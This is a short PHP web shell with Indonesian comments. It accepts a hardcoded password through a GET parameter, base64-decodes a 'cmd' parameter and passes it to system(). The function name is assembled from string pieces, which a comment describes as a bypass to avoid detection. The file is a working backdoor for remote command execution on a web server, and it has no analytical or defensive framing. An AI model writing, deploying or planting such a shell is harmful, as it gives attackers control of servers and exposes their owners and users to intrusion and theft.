<?php
$auth_pass = "darell";
$kunci = "cmd";

// Bypass fungsi `system`
$fnc = 's' . 'ys' . 'tem';

// Cek password
if (isset($_GET['pass']) && $_GET['pass'] === $auth_pass) {
    // Cek command base64
    if (isset($_GET[$kunci])) {
        $cmd = base64_decode($_GET[$kunci]);
        header("Content-Type: text/plain");
        $fnc($cmd);
    } else {
        echo "Perintah tidak ditemukan.";
    }
} else {
    echo "Akses ditolak.";
}
?>
